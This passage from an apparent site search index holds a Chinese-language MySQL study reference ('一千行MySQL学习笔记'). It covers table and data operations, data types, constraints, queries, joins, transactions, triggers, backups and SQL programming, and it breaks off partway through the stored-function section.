ACL，数据节点，会话，watcher机制等等。\n  zookeeper 的典型应用场景，比如选主，注册中心等等。\n如果忘了可以回去看看再次理解一下，如果有疑问和建议欢迎提出🤝🤝🤝。\n  "},{"id":320,"href":"/database/mysql/%E4%B8%80%E5%8D%83%E8%A1%8CMySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","title":"一千行MySQL学习笔记","parent":"mysql","content":" 原文地址：https://shockerli.net/post/1000-line-mysql-note/ ，JavaGuide 对本文进行了简答排版，新增了目录。 作者：格物\n 非常不错的总结，强烈建议保存下来，需要的时候看一看。\n 基本操作 数据库操作 表的操作 数据操作 字符集编码 数据类型(列类型) 列属性(列约束) 建表规范 SELECT UNION 子查询 连接查询(join) TRUNCATE 备份与还原 视图 事务(transaction) 锁表 触发器 SQL编程 存储过程 用户和权限管理 表维护 杂项  基本操作    /* Windows服务 */ -- 启动MySQL  net start mysql -- 创建Windows服务  sc create mysql binPath= mysqld_bin_path(注意：等号与值之间有空格) /* 连接与断开服务器 */ mysql -h 地址 -P 端口 -u 用户名 -p 密码 SHOW PROCESSLIST -- 显示哪些线程正在运行 SHOW VARIABLES -- 显示系统变量信息 数据库操作    /* 数据库操作 */ ------------------ -- 查看当前数据库  SELECT DATABASE(); -- 显示当前时间、用户名、数据库版本  SELECT now(), user(), version(); -- 创建库  CREATE DATABASE[ IF NOT EXISTS] 数据库名 数据库选项 数据库选项： CHARACTER SET charset_name COLLATE collation_name -- 查看已有库  SHOW DATABASES[ LIKE \u0026#39;PATTERN\u0026#39;] -- 查看当前库信息  SHOW CREATE DATABASE 数据库名 -- 修改库的选项信息  ALTER DATABASE 库名 选项信息 -- 删除库  DROP DATABASE[ IF EXISTS] 数据库名 同时删除该数据库相关的目录及其目录内容 表的操作    -- 创建表  CREATE [TEMPORARY] TABLE[ IF NOT EXISTS] [库名.]表名 ( 表的结构定义 )[ 表选项] 每个字段必须有数据类型 最后一个字段后不能有逗号 TEMPORARY 临时表，会话结束时表自动消失 对于字段的定义： 字段名 数据类型 [NOT NULL | NULL] [DEFAULT default_value] [AUTO_INCREMENT] [UNIQUE [KEY] | [PRIMARY] KEY] [COMMENT \u0026#39;string\u0026#39;] -- 表选项  -- 字符集  CHARSET = charset_name 如果表没有设定，则使用数据库字符集 -- 存储引擎  ENGINE = engine_name 表在管理数据时采用的不同的数据结构，结构不同会导致处理方式、提供的特性操作等不同 常见的引擎：InnoDB MyISAM Memory/Heap BDB Merge Example CSV MaxDB Archive 不同的引擎在保存表的结构和数据时采用不同的方式 MyISAM表文件含义：.frm表定义，.MYD表数据，.MYI表索引 InnoDB表文件含义：.frm表定义，表空间数据和日志文件 SHOW ENGINES -- 显示存储引擎的状态信息  SHOW ENGINE 引擎名 {LOGS|STATUS} -- 显示存储引擎的日志或状态信息  -- 自增起始数  AUTO_INCREMENT = 行数 -- 数据文件目录  DATA DIRECTORY = \u0026#39;目录\u0026#39; -- 索引文件目录  INDEX DIRECTORY = \u0026#39;目录\u0026#39; -- 表注释  COMMENT = \u0026#39;string\u0026#39; -- 分区选项  PARTITION BY ... (详细见手册) -- 查看所有表  SHOW TABLES[ LIKE \u0026#39;pattern\u0026#39;] SHOW TABLES FROM 库名 -- 查看表结构  SHOW CREATE TABLE 表名 （信息更详细） DESC 表名 / DESCRIBE 表名 / EXPLAIN 表名 / SHOW COLUMNS FROM 表名 [LIKE \u0026#39;PATTERN\u0026#39;] SHOW TABLE STATUS [FROM db_name] [LIKE \u0026#39;pattern\u0026#39;] -- 修改表  -- 修改表本身的选项  ALTER TABLE 表名 表的选项 eg: ALTER TABLE 表名 ENGINE=MYISAM; -- 对表进行重命名  RENAME TABLE 原表名 TO 新表名 RENAME TABLE 原表名 TO 库名.表名 （可将表移动到另一个数据库） -- RENAME可以交换两个表名  -- 修改表的字段机构（13.1.2. ALTER TABLE语法）  ALTER TABLE 表名 操作名 -- 操作名  ADD[ COLUMN] 字段定义 -- 增加字段  AFTER 字段名 -- 表示增加在该字段名后面  FIRST -- 表示增加在第一个  ADD PRIMARY KEY(字段名) -- 创建主键  ADD UNIQUE [索引名] (字段名)-- 创建唯一索引  ADD INDEX [索引名] (字段名) -- 创建普通索引  DROP[ COLUMN] 字段名 -- 删除字段  MODIFY[ COLUMN] 字段名 字段属性 -- 支持对字段属性进行修改，不能修改字段名(所有原有属性也需写上)  CHANGE[ COLUMN] 原字段名 新字段名 字段属性 -- 支持对字段名修改  DROP PRIMARY KEY -- 删除主键(删除主键前需删除其AUTO_INCREMENT属性)  DROP INDEX 索引名 -- 删除索引  DROP FOREIGN KEY 外键 -- 删除外键 -- 删除表  DROP TABLE[ IF EXISTS] 表名 ... -- 清空表数据  TRUNCATE [TABLE] 表名 -- 复制表结构  CREATE TABLE 表名 LIKE 要复制的表名 -- 复制表结构和数据  CREATE TABLE 表名 [AS] SELECT * FROM 要复制的表名 -- 检查表是否有错误  CHECK TABLE tbl_name [, tbl_name] ... [option] ... -- 优化表  OPTIMIZE [LOCAL | NO_WRITE_TO_BINLOG] TABLE tbl_name [, tbl_name] ... -- 修复表  REPAIR [LOCAL | NO_WRITE_TO_BINLOG] TABLE tbl_name [, tbl_name] ... [QUICK] [EXTENDED] [USE_FRM] -- 分析表  ANALYZE [LOCAL | NO_WRITE_TO_BINLOG] TABLE tbl_name [, tbl_name] ... 数据操作    /* 数据操作 */ ------------------ -- 增  INSERT [INTO] 表名 [(字段列表)] VALUES (值列表)[, (值列表), ...] -- 如果要插入的值列表包含所有字段并且顺序一致，则可以省略字段列表。  -- 可同时插入多条数据记录！  REPLACE 与 INSERT 完全一样，可互换。 INSERT [INTO] 表名 SET 字段名=值[, 字段名=值, ...] -- 查  SELECT 字段列表 FROM 表名[ 其他子句] -- 可来自多个表的多个字段  -- 其他子句可以不使用  -- 字段列表可以用*代替，表示所有字段 -- 删  DELETE FROM 表名[ 删除条件子句] 没有条件子句，则会删除全部 -- 改  UPDATE 表名 SET 字段名=新值[, 字段名=新值] [更新条件] 字符集编码    /* 字符集编码 */ ------------------ -- MySQL、数据库、表、字段均可设置编码 -- 数据编码与客户端编码不需一致 SHOW VARIABLES LIKE \u0026#39;character_set_%\u0026#39; -- 查看所有字符集编码项  character_set_client 客户端向服务器发送数据时使用的编码 character_set_results 服务器端将结果返回给客户端所使用的编码 character_set_connection 连接层编码 SET 变量名 = 变量值 SET character_set_client = gbk; SET character_set_results = gbk; SET character_set_connection = gbk; SET NAMES GBK; -- 相当于完成以上三个设置 -- 校对集  校对集用以排序 SHOW CHARACTER SET [LIKE \u0026#39;pattern\u0026#39;]/SHOW CHARSET [LIKE \u0026#39;pattern\u0026#39;] 查看所有字符集 SHOW COLLATION [LIKE \u0026#39;pattern\u0026#39;] 查看所有校对集 CHARSET 字符集编码 设置字符集编码 COLLATE 校对集编码 设置校对集编码 数据类型(列类型)    /* 数据类型（列类型） */ ------------------ 1. 数值类型 -- a. 整型 ----------  类型 字节 范围（有符号位） tinyint 1字节 -128 ~ 127 无符号位：0 ~ 255 smallint 2字节 -32768 ~ 32767 mediumint 3字节 -8388608 ~ 8388607 int 4字节 bigint 8字节 int(M) M表示总位数 - 默认存在符号位，unsigned 属性修改 - 显示宽度，如果某个数不够定义字段时设置的位数，则前面以0补填，zerofill 属性修改 例：int(5) 插入一个数\u0026#39;123\u0026#39;，补填后为\u0026#39;00123\u0026#39; - 在满足要求的情况下，越小越好。 - 1表示bool值真，0表示bool值假。MySQL没有布尔类型，通过整型0和1表示。常用tinyint(1)表示布尔型。 -- b. 浮点型 ----------  类型 字节 范围 float(单精度) 4字节 double(双精度) 8字节 浮点型既支持符号位 unsigned 属性，也支持显示宽度 zerofill 属性。 不同于整型，前后均会补填0. 定义浮点型时，需指定总位数和小数位数。 float(M, D) double(M, D) M表示总位数，D表示小数位数。 M和D的大小会决定浮点数的范围。不同于整型的固定范围。 M既表示总位数（不包括小数点和正负号），也表示显示宽度（所有显示符号均包括）。 支持科学计数法表示。 浮点数表示近似值。 -- c. 定点数 ----------  decimal -- 可变长度  decimal(M, D) M也表示总位数，D表示小数位数。 保存一个精确的数值，不会发生数据的改变，不同于浮点数的四舍五入。 将浮点数转换为字符串来保存，每9位数字保存为4个字节。 2. 字符串类型 -- a. char, varchar ----------  char 定长字符串，速度快，但浪费空间 varchar 变长字符串，速度慢，但节省空间 M表示能存储的最大长度，此长度是字符数，非字节数。 不同的编码，所占用的空间不同。 char,最多255个字符，与编码无关。 varchar,最多65535字符，与编码有关。 一条有效记录最大不能超过65535个字节。 utf8 最大为21844个字符，gbk 最大为32766个字符，latin1 最大为65532个字符 varchar 是变长的，需要利用存储空间保存 varchar 的长度，如果数据小于255个字节，则采用一个字节来保存长度，反之需要两个字节来保存。 varchar 的最大有效长度由最大行大小和使用的字符集确定。 最大有效长度是65532字节，因为在varchar存字符串时，第一个字节是空的，不存在任何数据，然后还需两个字节来存放字符串的长度，所以有效长度是65535-1-2=65532字节。 例：若一个表定义为 CREATE TABLE tb(c1 int, c2 char(30), c3 varchar(N)) charset=utf8; 问N的最大值是多少？ 答：(65535-1-2-4-30*3)/3 -- b. blob, text ----------  blob 二进制字符串（字节字符串） tinyblob, blob, mediumblob, longblob text 非二进制字符串（字符字符串） tinytext, text, mediumtext, longtext text 在定义时，不需要定义长度，也不会计算总长度。 text 类型在定义时，不可给default值 -- c. binary, varbinary ----------  类似于char和varchar，用于保存二进制字符串，也就是保存字节字符串而非字符字符串。 char, varchar, text 对应 binary, varbinary, blob. 3. 日期时间类型 一般用整型保存时间戳，因为PHP可以很方便的将时间戳进行格式化。 datetime 8字节 日期及时间 1000-01-01 00:00:00 到 9999-12-31 23:59:59 date 3字节 日期 1000-01-01 到 9999-12-31 timestamp 4字节 时间戳 19700101000000 到 2038-01-19 03:14:07 time 3字节 时间 -838:59:59 到 838:59:59 year 1字节 年份 1901 - 2155 datetime YYYY-MM-DD hh:mm:ss timestamp YY-MM-DD hh:mm:ss YYYYMMDDhhmmss YYMMDDhhmmss YYYYMMDDhhmmss YYMMDDhhmmss date YYYY-MM-DD YY-MM-DD YYYYMMDD YYMMDD YYYYMMDD YYMMDD time hh:mm:ss hhmmss hhmmss year YYYY YY YYYY YY 4. 枚举和集合 -- 枚举(enum) ---------- enum(val1, val2, val3...) 在已知的值中进行单选。最大数量为65535. 枚举值在保存时，以2个字节的整型(smallint)保存。每个枚举值，按保存的位置顺序，从1开始逐一递增。 表现为字符串类型，存储却是整型。 NULL值的索引是NULL。 空字符串错误值的索引值是0。 -- 集合（set） ---------- set(val1, val2, val3...) create table tab ( gender set(\u0026#39;男\u0026#39;, \u0026#39;女\u0026#39;, \u0026#39;无\u0026#39;) ); insert into tab values (\u0026#39;男, 女\u0026#39;); 最多可以有64个不同的成员。以bigint存储，共8个字节。采取位运算的形式。 当创建表时，SET成员值的尾部空格将自动被删除。 列属性(列约束)    /* 列属性（列约束） */ ------------------ 1. PRIMARY 主键  - 能唯一标识记录的字段，可以作为主键。 - 一个表只能有一个主键。 - 主键具有唯一性。 - 声明字段时，用 primary key 标识。 也可以在字段列表之后声明 例：create table tab ( id int, stu varchar(10), primary key (id)); - 主键字段的值不能为null。 - 主键可以由多个字段共同组成。此时需要在字段列表后声明的方法。 例：create table tab ( id int, stu varchar(10), age int, primary key (stu, age)); 2. UNIQUE 唯一索引（唯一约束） 使得某字段的值也不能重复。 3. NULL 约束 null不是数据类型，是列的一个属性。 表示当前列是否可以为null，表示什么都没有。 null, 允许为空。默认。 not null, 不允许为空。 insert into tab values (null, \u0026#39;val\u0026#39;); -- 此时表示将第一个字段的值设为null, 取决于该字段是否允许为null 4. DEFAULT 默认值属性 当前字段的默认值。 insert into tab values (default, \u0026#39;val\u0026#39;); -- 此时表示强制使用默认值。  create table tab ( add_time timestamp default current_timestamp ); -- 表示将当前时间的时间戳设为默认值。  current_date, current_time 5. AUTO_INCREMENT 自动增长约束 自动增长必须为索引（主键或unique） 只能存在一个字段为自动增长。 默认为1开始自动增长。可以通过表属性 auto_increment = x进行设置，或 alter table tbl auto_increment = x; 6. COMMENT 注释 例：create table tab ( id int ) comment \u0026#39;注释内容\u0026#39;; 7. FOREIGN KEY 外键约束 用于限制主表与从表数据完整性。 alter table t1 add constraint `t1_t2_fk` foreign key (t1_id) references t2(id); -- 将表t1的t1_id外键关联到表t2的id字段。  -- 每个外键都有一个名字，可以通过 constraint 指定  存在外键的表，称之为从表（子表），外键指向的表，称之为主表（父表）。 作用：保持数据一致性，完整性，主要目的是控制存储在外键表（从表）中的数据。 MySQL中，可以对InnoDB引擎使用外键约束： 语法： foreign key (外键字段） references 主表名 (关联字段) [主表记录删除时的动作] [主表记录更新时的动作] 此时需要检测一个从表的外键需要约束为主表的已存在的值。外键在没有关联的情况下，可以设置为null.前提是该外键列，没有not null。 可以不指定主表记录更改或更新时的动作，那么此时主表的操作被拒绝。 如果指定了 on update 或 on delete：在删除或更新时，有如下几个操作可以选择： 1. cascade，级联操作。主表数据被更新（主键值更新），从表也被更新（外键值更新）。主表记录被删除，从表相关记录也被删除。 2. set null，设置为null。主表数据被更新（主键值更新），从表的外键被设置为null。主表记录被删除，从表相关记录外键被设置成null。但注意，要求该外键列，没有not null属性约束。 3. restrict，拒绝父表删除和更新。 注意，外键只被InnoDB存储引擎所支持。其他引擎是不支持的。 建表规范    /* 建表规范 */ ------------------ -- Normal Format, NF  - 每个表保存一个实体信息 - 每个具有一个ID字段作为主键 - ID主键 + 原子表 -- 1NF, 第一范式  字段不能再分，就满足第一范式。 -- 2NF, 第二范式  满足第一范式的前提下，不能出现部分依赖。 消除复合主键就可以避免部分依赖。增加单列关键字。 -- 3NF, 第三范式  满足第二范式的前提下，不能出现传递依赖。 某个字段依赖于主键，而有其他字段依赖于该字段。这就是传递依赖。 将一个实体信息的数据放在一个表内实现。 SELECT    /* SELECT */ ------------------ SELECT [ALL|DISTINCT] select_expr FROM -\u0026gt; WHERE -\u0026gt; GROUP BY [合计函数] -\u0026gt; HAVING -\u0026gt; ORDER BY -\u0026gt; LIMIT a. select_expr -- 可以用 * 表示所有字段。  select * from tb; -- 可以使用表达式（计算公式、函数调用、字段也是个表达式）  select stu, 29+25, now() from tb; -- 可以为每个列使用别名。适用于简化列标识，避免多个列标识符重复。  - 使用 as 关键字，也可省略 as. select stu+10 as add10 from tb; b. FROM 子句 用于标识查询来源。 -- 可以为表起别名。使用as关键字。  SELECT * FROM tb1 AS tt, tb2 AS bb; -- from子句后，可以同时出现多个表。  -- 多个表会横向叠加到一起，而数据会形成一个笛卡尔积。  SELECT * FROM tb1, tb2; -- 向优化符提示如何选择索引  USE INDEX、IGNORE INDEX、FORCE INDEX SELECT * FROM table1 USE INDEX (key1,key2) WHERE key1=1 AND key2=2 AND key3=3; SELECT * FROM table1 IGNORE INDEX (key3) WHERE key1=1 AND key2=2 AND key3=3; c. WHERE 子句 -- 从from获得的数据源中进行筛选。  -- 整型1表示真，0表示假。  -- 表达式由运算符和运算数组成。  -- 运算数：变量（字段）、值、函数返回值  -- 运算符：  =, \u0026lt;=\u0026gt;, \u0026lt;\u0026gt;, !=, \u0026lt;=, \u0026lt;, \u0026gt;=, \u0026gt;, !, \u0026amp;\u0026amp;, ||, in (not) null, (not) like, (not) in, (not) between and, is (not), and, or, not, xor is/is not 加上ture/false/unknown，检验某个值的真假 \u0026lt;=\u0026gt;与\u0026lt;\u0026gt;功能相同，\u0026lt;=\u0026gt;可用于null比较 d. GROUP BY 子句, 分组子句 GROUP BY 字段/别名 [排序方式] 分组后会进行排序。升序：ASC，降序：DESC 以下[合计函数]需配合 GROUP BY 使用： count 返回不同的非NULL值数目 count(*)、count(字段) sum 求和 max 求最大值 min 求最小值 avg 求平均值 group_concat 返回带有来自一个组的连接的非NULL值的字符串结果。组内字符串连接。 e. HAVING 子句，条件子句 与 where 功能、用法相同，执行时机不同。 where 在开始时执行检测数据，对原数据进行过滤。 having 对筛选出的结果再次进行过滤。 having 字段必须是查询出来的，where 字段必须是数据表存在的。 where 不可以使用字段的别名，having 可以。因为执行WHERE代码时，可能尚未确定列值。 where 不可以使用合计函数。一般需用合计函数才会用 having SQL标准要求HAVING必须引用GROUP BY子句中的列或用于合计函数中的列。 f. ORDER BY 子句，排序子句 order by 排序字段/别名 排序方式 [,排序字段/别名 排序方式]... 升序：ASC，降序：DESC 支持多个字段的排序。 g. LIMIT 子句，限制结果数量子句 仅对处理好的结果进行数量限制。将处理好的结果的看作是一个集合，按照记录出现的顺序，索引从0开始。 limit 起始位置, 获取条数 省略第一个参数，表示从索引0开始。limit 获取条数 h. DISTINCT, ALL 选项 distinct 去除重复记录 默认为 all, 全部记录 UNION    /* UNION */ ------------------ 将多个select查询的结果组合成一个结果集合。  SELECT ... UNION [ALL|DISTINCT] SELECT ... 默认 DISTINCT 方式，即所有返回的行都是唯一的 建议，对每个SELECT查询加上小括号包裹。 ORDER BY 排序时，需加上 LIMIT 进行结合。 需要各select查询的字段数量一样。 每个select查询的字段列表(数量、类型)应一致，因为结果中的字段名以第一条select语句为准。 子查询    /* 子查询 */ ------------------ - 子查询需用括号包裹。 -- from型  from后要求是一个表，必须给子查询结果取个别名。 - 简化每个查询内的条件。 - from型需将结果生成一个临时表格，可用以原表的锁定的释放。 - 子查询返回一个表，表型子查询。 select * from (select * from tb where id\u0026gt;0) as subfrom where id\u0026gt;1; -- where型  - 子查询返回一个值，标量子查询。 - 不需要给子查询取别名。 - where子查询内的表，不能直接用以更新。 select * from tb where money = (select max(money) from tb); -- 列子查询  如果子查询结果返回的是一列。 使用 in 或 not in 完成查询 exists 和 not exists 条件 如果子查询返回数据，则返回1或0。常用于判断条件。 select column1 from t1 where exists (select * from t2); -- 行子查询  查询条件是一个行。 select * from t1 where (id, gender) in (select id, gender from t2); 行构造符：(col1, col2, ...) 或 ROW(col1, col2, ...) 行构造符通常用于与对能返回两个或两个以上列的子查询进行比较。 -- 特殊运算符  != all() 相当于 not in = some() 相当于 in。any 是 some 的别名 != some() 不等同于 not in，不等于其中某一个。 all, some 可以配合其他运算符一起使用。 连接查询(join)    /* 连接查询(join) */ ------------------ 将多个表的字段进行连接，可以指定连接条件。 -- 内连接(inner join)  - 默认就是内连接，可省略inner。 - 只有数据存在时才能发送连接。即连接结果不能出现空行。 on 表示连接条件。其条件表达式与where类似。也可以省略条件（表示条件永远为真） 也可用where表示连接条件。 还有 using, 但需字段名相同。 using(字段名) -- 交叉连接 cross join  即，没有条件的内连接。 select * from tb1 cross join tb2; -- 外连接(outer join)  - 如果数据不存在，也会出现在连接结果中。 -- 左外连接 left join  如果数据不存在，左表记录会出现，而右表为null填充 -- 右外连接 right join  如果数据不存在，右表记录会出现，而左表为null填充 -- 自然连接(natural join)  自动判断连接条件完成连接。 相当于省略了using，会自动查找相同字段名。 natural join natural left join natural right join select info.id, info.name, info.stu_num, extra_info.hobby, extra_info.sex from info, extra_info where info.stu_num = extra_info.stu_id; TRUNCATE    /* TRUNCATE */ ------------------ TRUNCATE [TABLE] tbl_name 清空数据 删除重建表 区别： 1，truncate 是删除表再创建，delete 是逐条删除 2，truncate 重置auto_increment的值。而delete不会 3，truncate 不知道删除了几条，而delete知道。 4，当被用于带分区的表时，truncate 会保留分区 备份与还原    /* 备份与还原 */ ------------------ 备份，将数据的结构与表内数据保存起来。 利用 mysqldump 指令完成。 -- 导出 mysqldump [options] db_name [tables] mysqldump [options] ---database DB1 [DB2 DB3...] mysqldump [options] --all--database 1. 导出一张表 mysqldump -u用户名 -p密码 库名 表名 \u0026gt; 文件名(D:/a.sql) 2. 导出多张表 mysqldump -u用户名 -p密码 库名 表1 表2 表3 \u0026gt; 文件名(D:/a.sql) 3. 导出所有表 mysqldump -u用户名 -p密码 库名 \u0026gt; 文件名(D:/a.sql) 4. 导出一个库 mysqldump -u用户名 -p密码 --lock-all-tables --database 库名 \u0026gt; 文件名(D:/a.sql) 可以-w携带WHERE条件 -- 导入 1. 在登录mysql的情况下： source 备份文件 2. 在不登录的情况下 mysql -u用户名 -p密码 库名 \u0026lt; 备份文件 视图    什么是视图： 视图是一个虚拟表，其内容由查询定义。同真实的表一样，视图包含一系列带有名称的列和行数据。但是，视图并不在数据库中以存储的数据值集形式存在。行和列数据来自由定义视图的查询所引用的表，并且在引用视图时动态生成。 视图具有表结构文件，但不存在数据文件。 对其中所引用的基础表来说，视图的作用类似于筛选。定义视图的筛选可以来自当前或其它数据库的一个或多个表，或者其它视图。通过视图进行查询没有任何限制，通过它们进行数据修改时的限制也很少。 视图是存储在数据库中的查询的sql语句，它主要出于两种原因：安全原因，视图可以隐藏一些数据，如：社会保险基金表，可以用视图只显示姓名，地址，而不显示社会保险号和工资数等，另一原因是可使复杂的查询易于理解和使用。 -- 创建视图 CREATE [OR REPLACE] [ALGORITHM = {UNDEFINED | MERGE | TEMPTABLE}] VIEW view_name [(column_list)] AS select_statement - 视图名必须唯一，同时不能与表重名。 - 视图可以使用select语句查询到的列名，也可以自己指定相应的列名。 - 可以指定视图执行的算法，通过ALGORITHM指定。 - column_list如果存在，则数目必须等于SELECT语句检索的列数 -- 查看结构  SHOW CREATE VIEW view_name -- 删除视图  - 删除视图后，数据依然存在。 - 可同时删除多个视图。 DROP VIEW [IF EXISTS] view_name ... -- 修改视图结构  - 一般不修改视图，因为不是所有的更新视图都会映射到表上。 ALTER VIEW view_name [(column_list)] AS select_statement -- 视图作用  1. 简化业务逻辑 2. 对客户端隐藏真实的表结构 -- 视图算法(ALGORITHM)  MERGE 合并 将视图的查询语句，与外部查询需要先合并再执行！ TEMPTABLE 临时表 将视图执行完毕后，形成临时表，再做外层查询！ UNDEFINED 未定义(默认)，指的是MySQL自主去选择相应的算法。 事务(transaction)    事务是指逻辑上的一组操作，组成这组操作的各个单元，要不全成功要不全失败。 - 支持连续SQL的集体成功或集体撤销。 - 事务是数据库在数据完整性方面的一个功能。 - 需要利用 InnoDB 或 BDB 存储引擎，对自动提交的特性支持完成。 - InnoDB被称为事务安全型引擎。 -- 事务开启  START TRANSACTION; 或者 BEGIN; 开启事务后，所有被执行的SQL语句均被认作当前事务内的SQL语句。 -- 事务提交  COMMIT; -- 事务回滚  ROLLBACK; 如果部分操作发生问题，映射到事务开启前。 -- 事务的特性  1. 原子性（Atomicity） 事务是一个不可分割的工作单位，事务中的操作要么都发生，要么都不发生。 2. 一致性（Consistency） 事务前后数据的完整性必须保持一致。 - 事务开始和结束时，外部数据一致 - 在整个事务过程中，操作是连续的 3. 隔离性（Isolation） 多个用户并发访问数据库时，一个用户的事务不能被其它用户的事务所干扰，多个并发事务之间的数据要相互隔离。 4. 持久性（Durability） 一个事务一旦被提交，它对数据库中的数据改变就是永久性的。 -- 事务的实现  1. 要求是事务支持的表类型 2. 执行一组相关的操作前开启事务 3. 整组操作完成后，都成功，则提交；如果存在失败，选择回滚，则会回到事务开始的备份点。 -- 事务的原理  利用InnoDB的自动提交(autocommit)特性完成。 普通的MySQL执行语句后，当前的数据提交操作均可被其他客户端可见。 而事务是暂时关闭“自动提交”机制，需要commit提交持久化数据操作。 -- 注意  1. 数据定义语言（DDL）语句不能被回滚，比如创建或取消数据库的语句，和创建、取消或更改表或存储的子程序的语句。 2. 事务不能被嵌套 -- 保存点  SAVEPOINT 保存点名称 -- 设置一个事务保存点  ROLLBACK TO SAVEPOINT 保存点名称 -- 回滚到保存点  RELEASE SAVEPOINT 保存点名称 -- 删除保存点 -- InnoDB自动提交特性设置  SET autocommit = 0|1; 0表示关闭自动提交，1表示开启自动提交。 - 如果关闭了，那普通操作的结果对其他客户端也不可见，需要commit提交后才能持久化数据操作。 - 也可以关闭自动提交来开启事务。但与START TRANSACTION不同的是， SET autocommit是永久改变服务器的设置，直到下次再次修改该设置。(针对当前连接) 而START TRANSACTION记录开启前的状态，而一旦事务提交或回滚后就需要再次开启事务。(针对当前事务) 锁表    /* 锁表 */ 表锁定只用于防止其它客户端进行不正当地读取和写入 MyISAM 支持表锁，InnoDB 支持行锁 -- 锁定  LOCK TABLES tbl_name [AS alias] -- 解锁  UNLOCK TABLES 触发器    /* 触发器 */ ------------------ 触发程序是与表有关的命名数据库对象，当该表出现特定事件时，将激活该对象  监听：记录的增加、修改、删除。 -- 创建触发器 CREATE TRIGGER trigger_name trigger_time trigger_event ON tbl_name FOR EACH ROW trigger_stmt 参数： trigger_time是触发程序的动作时间。它可以是 before 或 after，以指明触发程序是在激活它的语句之前或之后触发。 trigger_event指明了激活触发程序的语句的类型 INSERT：将新行插入表时激活触发程序 UPDATE：更改某一行时激活触发程序 DELETE：从表中删除某一行时激活触发程序 tbl_name：监听的表，必须是永久性的表，不能将触发程序与TEMPORARY表或视图关联起来。 trigger_stmt：当触发程序激活时执行的语句。执行多个语句，可使用BEGIN...END复合语句结构 -- 删除 DROP TRIGGER [schema_name.]trigger_name 可以使用old和new代替旧的和新的数据 更新操作，更新前是old，更新后是new. 删除操作，只有old. 增加操作，只有new. -- 注意  1. 对于具有相同触发程序动作时间和事件的给定表，不能有两个触发程序。 -- 字符连接函数 concat(str1,str2,...]) concat_ws(separator,str1,str2,...) -- 分支语句 if 条件 then 执行语句 elseif 条件 then 执行语句 else 执行语句 end if; -- 修改最外层语句结束符 delimiter 自定义结束符号 SQL语句 自定义结束符号 delimiter ; -- 修改回原来的分号 -- 语句块包裹 begin 语句块 end -- 特殊的执行 1. 只要添加记录，就会触发程序。 2. Insert into on duplicate key update 语法会触发： 如果没有重复记录，会触发 before insert, after insert; 如果有重复记录并更新，会触发 before insert, before update, after update; 如果有重复记录但是没有发生更新，则触发 before insert, before update 3. Replace 语法 如果有记录，则执行 before insert, before delete, after delete, after insert SQL编程    /* SQL编程 */ ------------------ --// 局部变量 ---------- -- 变量声明  declare var_name[,...] type [default value] 这个语句被用来声明局部变量。要给变量提供一个默认值，请包含一个default子句。值可以被指定为一个表达式，不需要为一个常数。如果没有default子句，初始值为null。 -- 赋值  使用 set 和 select into 语句为变量赋值。 - 注意：在函数内是可以使用全局变量（用户自定义的变量） --// 全局变量 ---------- -- 定义、赋值 set 语句可以定义并为变量赋值。 set @var = value; 也可以使用select into语句为变量初始化并赋值。这样要求select语句只能返回一行，但是可以是多个字段，就意味着同时为多个变量进行赋值，变量的数量需要与查询的列数一致。 还可以把赋值语句看作一个表达式，通过select执行完成。此时为了避免=被当作关系运算符看待，使用:=代替。（set语句可以使用= 和 :=）。 select @var:=20; select @v1:=id, @v2=name from t1 limit 1; select * from tbl_name where @var:=30; select into 可以将表中查询获得的数据赋给变量。 -| select max(height) into @max_height from tb; -- 自定义变量名 为了避免select语句中，用户自定义的变量与系统标识符（通常是字段名）冲突，用户自定义变量在变量名前使用@作为开始符号。 @var=10; - 变量被定义后，在整个会话周期都有效（登录到退出） --// 控制结构 ---------- -- if语句 if search_condition then statement_list [elseif search_condition then statement_list] ... [else statement_list] end if; -- case语句 CASE value WHEN [compare-value] THEN result [WHEN [compare-value] THEN result ...] [ELSE result] END -- while循环 [begin_label:] while search_condition do statement_list end while [end_label]; - 如果需要在循环内提前终止 while循环，则需要使用标签；标签需要成对出现。 -- 退出循环  退出整个循环 leave 退出当前循环 iterate 通过退出的标签决定退出哪个循环 --// 内置函数 ---------- -- 数值函数 abs(x) -- 绝对值 abs(-10.9) = 10 format(x, d) -- 格式化千分位数值 format(1234567.456, 2) = 1,234,567.46 ceil(x) -- 向上取整 ceil(10.1) = 11 floor(x) -- 向下取整 floor (10.1) = 10 round(x) -- 四舍五入去整 mod(m, n) -- m%n m mod n 求余 10%3=1 pi() -- 获得圆周率 pow(m, n) -- m^n sqrt(x) -- 算术平方根 rand() -- 随机数 truncate(x, d) -- 截取d位小数 -- 时间日期函数 now(), current_timestamp(); -- 当前日期时间 current_date(); -- 当前日期 current_time(); -- 当前时间 date(\u0026#39;yyyy-mm-dd hh:ii:ss\u0026#39;); -- 获取日期部分 time(\u0026#39;yyyy-mm-dd hh:ii:ss\u0026#39;); -- 获取时间部分 date_format(\u0026#39;yyyy-mm-dd hh:ii:ss\u0026#39;, \u0026#39;%d %y %a %d %m %b %j\u0026#39;); -- 格式化时间 unix_timestamp(); -- 获得unix时间戳 from_unixtime(); -- 从时间戳获得时间 -- 字符串函数 length(string) -- string长度，字节 char_length(string) -- string的字符个数 substring(str, position [,length]) -- 从str的position开始,取length个字符 replace(str ,search_str ,replace_str) -- 在str中用replace_str替换search_str instr(string ,substring) -- 返回substring首次在string中出现的位置 concat(string [,...]) -- 连接字串 charset(str) -- 返回字串字符集 lcase(string) -- 转换成小写 left(string, length) -- 从string2中的左边起取length个字符 load_file(file_name) -- 从文件读取内容 locate(substring, string [,start_position]) -- 同instr,但可指定开始位置 lpad(string, length, pad) -- 重复用pad加在string开头,直到字串长度为length ltrim(string) -- 去除前端空格 repeat(string, count) -- 重复count次 rpad(string, length, pad) --在str后用pad补充,直到长度为length rtrim(string) -- 去除后端空格 strcmp(string1 ,string2) -- 逐字符比较两字串大小 -- 流程函数 case when [condition] then result [when [condition] then result ...] [else result] end 多分支 if(expr1,expr2,expr3) 双分支。 -- 聚合函数 count() sum(); max(); min(); avg(); group_concat() -- 其他常用函数 md5(); default(); --// 存储函数，自定义函数 ---------- -- 新建  CREATE FUNCTION function_name (参数列表) RETURNS 返回值类型 函数体 - 函数名，应该合法的标识符，并且不应该与已有的关键字冲突。 - 一个函数应该属于某个数据库，可以使用db_name.funciton_name的形式执行当前函数所属数据库，否则为当前数据库。 - 参数部分，由\u0026#34;参数名\u0026#34;和\u0026#34;参数类型\u0026#34;组成。多个参数用逗号隔开。 - 函数体由多条可用的mysql语句，流程控制，变量声明等语句构成。 - 多条语句应该使用 begin...end 语句块包含。 - 一定要有 return 返回值语句。 -- 删除  DROP FUNCTION [IF EXISTS] 